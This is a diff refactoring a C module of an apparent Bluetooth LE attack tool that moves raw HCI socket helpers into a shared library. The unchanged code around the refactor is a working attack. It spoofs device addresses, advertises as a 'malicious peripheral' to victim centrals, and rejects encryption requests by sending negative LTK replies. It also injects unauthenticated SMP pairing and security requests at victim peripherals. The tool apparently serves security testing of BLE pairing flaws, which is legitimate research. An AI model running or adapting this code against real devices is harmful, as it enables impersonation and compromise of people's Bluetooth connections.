@@ -12,6 +12,9 @@
 #include "blerp_attack.h"
 #include "../mgmt.h"
 #include "../ui.h"
+#include "../smp.h" // SMP_CODE_* opcodes
+#include "../wire/hci_wire.h"
+#include "../wire/hci_user_channel.h"
 
 #include <errno.h>
 #include <poll.h>
@@ -19,148 +22,18 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <sys/socket.h>
 #include <sys/time.h>
 #include <unistd.h>
 #include <openssl/rand.h>
 
-#define AF_BLUETOOTH_VAL     31
-#define BTPROTO_HCI_VAL      1
-#define HCI_CHANNEL_USER_VAL 1
-
-#define HCI_COMMAND_PKT      0x01
-#define HCI_ACLDATA_PKT      0x02
-#define HCI_EVENT_PKT        0x04
-
-#define HCI_EV_DISCONN_COMPL 0x05
-#define HCI_EV_CMD_COMPLETE  0x0e
-#define HCI_EV_CMD_STATUS    0x0f
-#define HCI_EV_LE_META       0x3e
-
-#define HCI_LE_EV_CONN_COMPL 0x01
-#define HCI_LE_EV_LTK_REQ    0x05
-#define HCI_LE_EV_CONN_COMPL_ENH 0x0a
-
-#define HCI_OP_DISCONNECT            0x0406
-#define HCI_OP_RESET                 0x0c03
-#define HCI_OP_LE_SET_EVENT_MASK     0x2001
-#define HCI_OP_LE_SET_RANDOM_ADDR    0x2005
-#define HCI_OP_LE_SET_ADV_PARAMS     0x2006
-#define HCI_OP_LE_SET_ADV_DATA       0x2008
-#define HCI_OP_LE_SET_ADV_ENABLE     0x200a
-#define HCI_OP_LE_CREATE_CONN        0x200d
-#define HCI_OP_LE_CREATE_CONN_CANCEL 0x200e
-#define HCI_OP_LE_LTK_NEG_REPLY      0x201b
-
-#define SMP_CID_VAL           0x0006
-#define SMP_OP_PAIRING_REQ    0x01
-#define SMP_OP_PAIRING_RSP    0x02
-#define SMP_OP_PAIRING_CONFIRM 0x03
-#define SMP_OP_PAIRING_RANDOM 0x04
-#define SMP_OP_PAIRING_FAIL   0x05
-#define SMP_OP_SECURITY_REQ   0x0b
-#define SMP_OP_PUBLIC_KEY     0x0c
-
-struct sockaddr_hci_raw {
-    uint16_t hci_family;
-    uint16_t hci_dev;
-    uint16_t hci_channel;
-};
-
-// Power the adapter on or off through the BlueZ mgmt control socket.
-static int blerp_mgmt_power(int dev_id, uint8_t powered) {
-    int mfd = mgmt_open();
-    if (mfd < 0) return -1;
-
-    uint8_t cmd[16];
-    ssize_t n = mgmt_build_command(cmd, sizeof(cmd), MGMT_OP_SET_POWERED,
-                                   (uint16_t)dev_id, &powered, 1);
-    int rc = -1;
-    if (n > 0 && write(mfd, cmd, (size_t)n) == n) {
-        for (int i = 0; i < 5; i++) {
-            struct pollfd pfd = { .fd = mfd, .events = POLLIN, .revents = 0 };
-            if (poll(&pfd, 1, 500) <= 0) break;
-            uint8_t rsp[64];
-            ssize_t r = read(mfd, rsp, sizeof rsp);
-            if (r < 9) continue;
-            uint16_t ev = (uint16_t)(rsp[0] | (rsp[1] << 8));
-            uint16_t op = (uint16_t)(rsp[6] | (rsp[7] << 8));
-            if (ev == MGMT_EV_CMD_COMPLETE && op == MGMT_OP_SET_POWERED) {
-                rc = (rsp[8] == 0x00) ? 0 : -1;
-                break;
-            }
-        }
-    }
-    mgmt_close(mfd);
-    return rc;
-}
-
-// Open and bind an HCI User Channel socket on the given adapter.
-static int blerp_hci_open(int dev_id) {
-    (void)blerp_mgmt_power(dev_id, 0);
-    usleep(50000);
-
-    int fd = socket(AF_BLUETOOTH_VAL, SOCK_RAW, BTPROTO_HCI_VAL);
-    if (fd < 0) {
-        (void)blerp_mgmt_power(dev_id, 1);
-        return -1;
-    }
-
-    struct sockaddr_hci_raw sa;
-    memset(&sa, 0, sizeof(sa));
-    sa.hci_family = AF_BLUETOOTH_VAL;
-    sa.hci_dev = (uint16_t)dev_id;
-    sa.hci_channel = HCI_CHANNEL_USER_VAL;
-    if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
-        int err = errno;
-        close(fd);
-        (void)blerp_mgmt_power(dev_id, 1);
-        errno = err;
-        return -1;
-    }
-    return fd;
-}
-
-// Close the HCI socket and re-enable adapter in BlueZ.
-static void blerp_hci_close(int fd, int dev_id) {
-    if (fd >= 0) close(fd);
-    (void)blerp_mgmt_power(dev_id, 1);
-}
-
-// Send a raw HCI command packet.
-static int blerp_hci_send_cmd(int fd, uint16_t opcode, const uint8_t *param, uint8_t plen) {
-    uint8_t buf[256];
-    buf[0] = HCI_COMMAND_PKT;
-    buf[1] = (uint8_t)(opcode & 0xff);
-    buf[2] = (uint8_t)(opcode >> 8);
-    buf[3] = plen;
-    if (plen && param) {
-        memcpy(&buf[4], param, plen);
-    }
-    ssize_t total = 4 + plen;
-    return (write(fd, buf, (size_t)total) == total) ? 0 : -1;
-}
-
-// Send an L2CAP ACL data packet on CID 0x0006 (SMP).
-static int blerp_hci_send_smp(int fd, uint16_t handle, const uint8_t *payload, uint16_t len) {
-    uint8_t pkt[256];
-    uint16_t acl_len = (uint16_t)(4 + len);
-
-    pkt[0] = HCI_ACLDATA_PKT;
-    pkt[1] = (uint8_t)(handle & 0xff);
-    pkt[2] = (uint8_t)(((handle >> 8) & 0x0f) | 0x00); // PB = 00b
-    pkt[3] = (uint8_t)(acl_len & 0xff);
-    pkt[4] = (uint8_t)(acl_len >> 8);
-
-    pkt[5] = (uint8_t)(len & 0xff);
-    pkt[6] = (uint8_t)(len >> 8);
-    pkt[7] = (uint8_t)(SMP_CID_VAL & 0xff);
-    pkt[8] = (uint8_t)(SMP_CID_VAL >> 8);
-
-    memcpy(&pkt[9], payload, len);
-    ssize_t total = 9 + len;
-    return (write(fd, pkt, (size_t)total) == total) ? 0 : -1;
-}
+#define SMP_CID_VAL             0x0006
+#define SMP_OP_PAIRING_REQ      SMP_CODE_PAIRING_REQUEST
+#define SMP_OP_PAIRING_RSP      SMP_CODE_PAIRING_RESPONSE
+#define SMP_OP_PAIRING_CONFIRM  0x03
+#define SMP_OP_PAIRING_RANDOM   0x04
+#define SMP_OP_PAIRING_FAIL     SMP_CODE_PAIRING_FAILED
+#define SMP_OP_SECURITY_REQ     SMP_CODE_SECURITY_REQUEST
+#define SMP_OP_PUBLIC_KEY       0x0c
 
 // Return standard vulnerability code.
 const char *blerp_vuln_code(enum blerp_vuln v) {
@@ -431,19 +304,19 @@ int blerp_run_pi(const struct blerp_attack_config *cfg, struct blerp_attack_repo
     if (!cfg || !rep) return -1;
     memset(rep, 0, sizeof *rep);
 
-    int fd = blerp_hci_open(cfg->dev_id);
+    int fd = hci_user_channel_open(cfg->dev_id);
     if (fd < 0) return -1;
 
-    blerp_hci_send_cmd(fd, HCI_OP_RESET, NULL, 0);
+    hci_user_channel_send_cmd(fd, HCI_OP_RESET, NULL, 0);
     usleep(80000);
 
     uint8_t le_mask[8] = { 0xff, 0x1f, 0x0a, 0x03, 0, 0, 0, 0 };
-    blerp_hci_send_cmd(fd, HCI_OP_LE_SET_EVENT_MASK, le_mask, 8);
+    hci_user_channel_send_cmd(fd, HCI_OP_LE_SET_EVENT_MASK, le_mask, 8);
 
     uint8_t own_addr_type = 0x00; // Public
     static const uint8_t zero_addr[6] = {0};
     if (memcmp(cfg->spoof_addr, zero_addr, 6) != 0) {
-        blerp_hci_send_cmd(fd, HCI_OP_LE_SET_RANDOM_ADDR, cfg->spoof_addr, 6);
+        hci_user_channel_send_cmd(fd, HCI_OP_LE_SET_RANDOM_ADDR, cfg->spoof_addr, 6);
         own_addr_type = 0x01; // Random
         printf("  [*] Peripheral address spoofed to: %02X:%02X:%02X:%02X:%02X:%02X\n",
                cfg->spoof_addr[5], cfg->spoof_addr[4], cfg->spoof_addr[3],
@@ -464,11 +337,11 @@ int blerp_run_pi(const struct blerp_attack_config *cfg, struct blerp_attack_repo
         0x00, 0, 0, 0, 0, 0, 0,
         0x07, 0x00
     };
-    blerp_hci_send_cmd(fd, HCI_OP_LE_SET_ADV_PARAMS, adv_params, sizeof adv_params);
-    blerp_hci_send_cmd(fd, HCI_OP_LE_SET_ADV_DATA, adv_data, sizeof adv_data);
+    hci_user_channel_send_cmd(fd, HCI_OP_LE_SET_ADV_PARAMS, adv_params, sizeof adv_params);
+    hci_user_channel_send_cmd(fd, HCI_OP_LE_SET_ADV_DATA, adv_data, sizeof adv_data);
 
     uint8_t enable = 0x01;
-    blerp_hci_send_cmd(fd, HCI_OP_LE_SET_ADV_ENABLE, &enable, 1);
+    hci_user_channel_send_cmd(fd, HCI_OP_LE_SET_ADV_ENABLE, &enable, 1);
     printf("  [*] Malicious peripheral advertising active. Awaiting victim Central connection...\n");
 
     uint16_t handle = 0;
@@ -489,7 +362,7 @@ int blerp_run_pi(const struct blerp_attack_config *cfg, struct blerp_attack_repo
         ssize_t n = read(fd, pkt, sizeof pkt);
         if (n < 8 || pkt[0] != HCI_EVENT_PKT || pkt[1] != HCI_EV_LE_META) continue;
         uint8_t sub = pkt[3];
-        if ((sub == HCI_LE_EV_CONN_COMPL || sub == HCI_LE_EV_CONN_COMPL_ENH) &&
+        if ((sub == HCI_SUBEVT_LE_CONN_COMPLETE || sub == HCI_SUBEVT_LE_CONN_COMPLETE_ENH) &&
             pkt[4] == 0x00 && pkt[7] == 0x01) {
             handle = (uint16_t)((pkt[5] | (pkt[6] << 8)) & 0x0fff);
             connected = true;
@@ -498,8 +371,8 @@ int blerp_run_pi(const struct blerp_attack_config *cfg, struct blerp_attack_repo
 
     if (!connected) {
         uint8_t off = 0x00;
-        blerp_hci_send_cmd(fd, HCI_OP_LE_SET_ADV_ENABLE, &off, 1);
-        blerp_hci_close(fd, cfg->dev_id);
+        hci_user_channel_send_cmd(fd, HCI_OP_LE_SET_ADV_ENABLE, &off, 1);
+        hci_user_channel_close(fd, cfg->dev_id);
         return 0;
     }
     rep->connected = true;
@@ -520,9 +393,9 @@ int blerp_run_pi(const struct blerp_attack_config *cfg, struct blerp_attack_repo
             uint8_t pkt[512];
             ssize_t n = read(fd, pkt, sizeof pkt);
             if (n >= 4 && pkt[0] == HCI_EVENT_PKT && pkt[1] == HCI_EV_LE_META &&
-                pkt[3] == HCI_LE_EV_LTK_REQ) {
+                pkt[3] == HCI_SUBEVT_LE_LTK_REQUEST) {
                 uint8_t neg[2] = { (uint8_t)(handle & 0xff), (uint8_t)(handle >> 8) };
-                blerp_hci_send_cmd(fd, HCI_OP_LE_LTK_NEG_REPLY, neg, sizeof neg);
+                hci_user_channel_send_cmd(fd, HCI_OP_LE_LTK_NEG_REPLY, neg, sizeof neg);
                 rep->enc_rejected = true;
                 printf("  %s[*] Session encryption request rejected (LL_REJECT_IND, V5).%s\n",
                        UI_PINK, UI_RESET);
@@ -534,7 +407,7 @@ int blerp_run_pi(const struct blerp_attack_config *cfg, struct blerp_attack_repo
     // Optional Security Request
     if (cfg->send_secreq) {
         uint8_t sreq[2] = { SMP_OP_SECURITY_REQ, cfg->sec_req_authreq };
-        blerp_hci_send_smp(fd, handle, sreq, sizeof sreq);
+        hci_user_channel_send_acl(fd, handle, SMP_CID_VAL, sreq, sizeof sreq);
         rep->secreq_sent = true;
         printf("  [*] Sent unauthenticated Security Request (AuthReq=0x%02x, V1).\n",
                cfg->sec_req_authreq);
@@ -578,7 +451,7 @@ int blerp_run_pi(const struct blerp_attack_config *cfg, struct blerp_attack_repo
 
                 uint8_t pres[7];
                 smp_legacy_make_rsp(&leg, pres);
-                blerp_hci_send_smp(fd, handle, pres, 7);
+                hci_user_channel_send_acl(fd, handle, SMP_CID_VAL, pres, 7);
                 rep->pres_sent = true;
                 answered_req = true;
                 rep->negotiated_authreq = pres[3];
@@ -591,7 +464,7 @@ int blerp_run_pi(const struct blerp_attack_config *cfg, struct blerp_attack_repo
 
                 uint8_t sconfirm[17];
                 smp_legacy_make_confirm(&leg, sconfirm);
-                blerp_hci_send_smp(fd, handle, sconfirm, 17);
+                hci_user_channel_send_acl(fd, handle, SMP_CID_VAL, sconfirm, 17);
                 answered_confirm = true;
                 printf("  [SMP] Sent Pairing Confirm (16 bytes)\n");
             } else if (op == SMP_OP_PAIRING_RANDOM) {
@@ -600,7 +473,7 @@ int blerp_run_pi(const struct blerp_attack_config *cfg, struct blerp_attack_repo
 
                 uint8_t srandom[17];
                 smp_legacy_make_random(&leg, srandom);
-                blerp_hci_send_smp(fd, handle, srandom, 17);
+                hci_user_channel_send_acl(fd, handle, SMP_CID_VAL, srandom, 17);
                 printf("  [SMP] Sent Pairing Random (16 bytes)\n");
 
                 if (leg.done && !leg.failed) {
@@ -627,11 +500,11 @@ int blerp_run_pi(const struct blerp_attack_config *cfg, struct blerp_attack_repo
     }
 
     uint8_t disc[3] = { (uint8_t)(handle & 0xff), (uint8_t)(handle >> 8), 0x13 };
-    blerp_hci_send_cmd(fd, HCI_OP_DISCONNECT, disc, 3);
+    hci_user_channel_send_cmd(fd, HCI_OP_DISCONNECT, disc, 3);
     usleep(20000);
     uint8_t off = 0x00;
-    blerp_hci_send_cmd(fd, HCI_OP_LE_SET_ADV_ENABLE, &off, 1);
-    blerp_hci_close(fd, cfg->dev_id);
+    hci_user_channel_send_cmd(fd, HCI_OP_LE_SET_ADV_ENABLE, &off, 1);
+    hci_user_channel_close(fd, cfg->dev_id);
     return 0;
 }
 
@@ -640,19 +513,19 @@ int blerp_run_ci(const struct blerp_attack_config *cfg, struct blerp_attack_repo
     if (!cfg || !rep) return -1;
     memset(rep, 0, sizeof *rep);
 
-    int fd = blerp_hci_open(cfg->dev_id);
+    int fd = hci_user_channel_open(cfg->dev_id);
     if (fd < 0) return -1;
 
-    blerp_hci_send_cmd(fd, HCI_OP_RESET, NULL, 0);
+    hci_user_channel_send_cmd(fd, HCI_OP_RESET, NULL, 0);
     usleep(80000);
 
     uint8_t le_mask[8] = { 0xff, 0x1f, 0x0a, 0x03, 0, 0, 0, 0 };
-    blerp_hci_send_cmd(fd, HCI_OP_LE_SET_EVENT_MASK, le_mask, 8);
+    hci_user_channel_send_cmd(fd, HCI_OP_LE_SET_EVENT_MASK, le_mask, 8);
 
     uint8_t own_addr_type = 0x00; // Public
     static const uint8_t zero_addr[6] = {0};
     if (memcmp(cfg->spoof_addr, zero_addr, 6) != 0) {
-        blerp_hci_send_cmd(fd, HCI_OP_LE_SET_RANDOM_ADDR, cfg->spoof_addr, 6);
+        hci_user_channel_send_cmd(fd, HCI_OP_LE_SET_RANDOM_ADDR, cfg->spoof_addr, 6);
         own_addr_type = 0x01; // Random
         printf("  [*] Central address spoofed to: %02X:%02X:%02X:%02X:%02X:%02X\n",
                cfg->spoof_addr[5], cfg->spoof_addr[4], cfg->spoof_addr[3],
@@ -676,7 +549,7 @@ int blerp_run_ci(const struct blerp_attack_config *cfg, struct blerp_attack_repo
     printf("  [*] Connecting to victim Peripheral %02X:%02X:%02X:%02X:%02X:%02X...\n",
            cfg->target_addr[5], cfg->target_addr[4], cfg->target_addr[3],
            cfg->target_addr[2], cfg->target_addr[1], cfg->target_addr[0]);
-    blerp_hci_send_cmd(fd, HCI_OP_LE_CREATE_CONN, conn_params, 25);
+    hci_user_channel_send_cmd(fd, HCI_OP_LE_CREATE_CONN, conn_params, 25);
 
     uint16_t handle = 0;
     bool connected = false;
@@ -696,15 +569,15 @@ int blerp_run_ci(const struct blerp_attack_config *cfg, struct blerp_attack_repo
         ssize_t n = read(fd, pkt, sizeof pkt);
         if (n < 8 || pkt[0] != HCI_EVENT_PKT || pkt[1] != HCI_EV_LE_META) continue;
         uint8_t sub = pkt[3];
-        if ((sub == HCI_LE_EV_CONN_COMPL || sub == HCI_LE_EV_CONN_COMPL_ENH) && pkt[4] == 0x00) {
+        if ((sub == HCI_SUBEVT_LE_CONN_COMPLETE || sub == HCI_SUBEVT_LE_CONN_COMPLETE_ENH) && pkt[4] == 0x00) {
             handle = (uint16_t)((pkt[5] | (pkt[6] << 8)) & 0x0fff);
             connected = true;
         }
     }
 
     if (!connected) {
-        blerp_hci_send_cmd(fd, HCI_OP_LE_CREATE_CONN_CANCEL, NULL, 0);
-        blerp_hci_close(fd, cfg->dev_id);
+        hci_user_channel_send_cmd(fd, HCI_OP_LE_CREATE_CONN_CANCEL, NULL, 0);
+        hci_user_channel_close(fd, cfg->dev_id);
         return 0;
     }
     rep->connected = true;
@@ -720,7 +593,7 @@ int blerp_run_ci(const struct blerp_attack_config *cfg, struct blerp_attack_repo
 
     uint8_t preq[7];
     smp_legacy_make_req(&leg, preq);
-    blerp_hci_send_smp(fd, handle, preq, 7);
+    hci_user_channel_send_acl(fd, handle, SMP_CID_VAL, preq, 7);
     rep->preq_sent = true;
     printf("  [SMP REQ] Injected unauthenticated Pairing Request (AuthReq=0x%02x, KeySize=%d, V2/V4/V6)\n",
            preq[3], preq[4]);
@@ -756,7 +629,7 @@ int blerp_run_ci(const struct blerp_attack_config *cfg, struct blerp_attack_repo
 
                 uint8_t mconfirm[17];
                 smp_legacy_make_confirm(&leg, mconfirm);
-                blerp_hci_send_smp(fd, handle, mconfirm, 17);
+                hci_user_channel_send_acl(fd, handle, SMP_CID_VAL, mconfirm, 17);
                 sent_confirm = true;
                 printf("  [SMP] Sent Pairing Confirm (16 bytes)\n");
             } else if (op == SMP_OP_PAIRING_CONFIRM && sent_confirm) {
@@ -765,7 +638,7 @@ int blerp_run_ci(const struct blerp_attack_config *cfg, struct blerp_attack_repo
 
                 uint8_t mrandom[17];
                 smp_legacy_make_random(&leg, mrandom);
-                blerp_hci_send_smp(fd, handle, mrandom, 17);
+                hci_user_channel_send_acl(fd, handle, SMP_CID_VAL, mrandom, 17);
                 printf("  [SMP] Sent Pairing Random (16 bytes)\n");
             } else if (op == SMP_OP_PAIRING_RANDOM) {
                 printf("  [SMP] Received Pairing Random from Peripheral (16 bytes)\n");
@@ -795,8 +668,8 @@ int blerp_run_ci(const struct blerp_attack_config *cfg, struct blerp_attack_repo
     }
 
     uint8_t disc[3] = { (uint8_t)(handle & 0xff), (uint8_t)(handle >> 8), 0x13 };
-    blerp_hci_send_cmd(fd, HCI_OP_DISCONNECT, disc, 3);
-    blerp_hci_close(fd, cfg->dev_id);
+    hci_user_channel_send_cmd(fd, HCI_OP_DISCONNECT, disc, 3);
+    hci_user_channel_close(fd, cfg->dev_id);
     return 0;
 }
 
